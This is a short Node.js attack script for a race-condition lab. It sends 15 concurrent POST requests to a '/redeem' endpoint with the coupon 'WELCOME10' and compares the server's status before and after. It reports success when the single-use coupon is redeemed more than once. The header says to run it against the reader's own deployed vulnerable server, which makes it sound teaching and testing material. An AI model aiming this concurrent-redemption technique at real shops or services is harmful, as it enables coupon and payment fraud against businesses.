// Race condition attack script — run this from your own computer against
// the deployed vulnerable server to test it remotely.
//
// Usage:
//   node attack.js https://your-race-lab.onrender.com
//
// Requires Node 18+ (built-in fetch).

const TARGET = process.argv[2];
const CONCURRENT_REQUESTS = 15;

if (!TARGET) {
  console.error("Usage: node attack.js <server-url>");
  console.error("Example: node attack.js https://your-race-lab.onrender.com");
  process.exit(1);
}

async function redeem() {
  const res = await fetch(`${TARGET}/redeem`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ code: "WELCOME10" }),
  });
  return res.json();
}

async function getStatus() {
  const res = await fetch(`${TARGET}/status`);
  return res.json();
}

async function main() {
  console.log(`Target: ${TARGET}`);
  console.log("Status before attack:");
  console.log(await getStatus());

  console.log(`\nFiring ${CONCURRENT_REQUESTS} concurrent /redeem requests...`);
  const results = await Promise.all(
    Array.from({ length: CONCURRENT_REQUESTS }, () => redeem())
  );

  const successes = results.filter((r) => r.success).length;
  console.log(`\n${successes} out of ${CONCURRENT_REQUESTS} requests succeeded.`);

  console.log("\nStatus after attack:");
  console.log(await getStatus());

  if (successes > 1) {
    console.log("\n✅ Race condition confirmed — coupon redeemed more than the intended limit of 1.");
  } else {
    console.log("\n❌ No race condition observed this run — try again, or increase CONCURRENT_REQUESTS.");
  }
}

main().catch((e) => console.error("Attack script failed:", e.message));
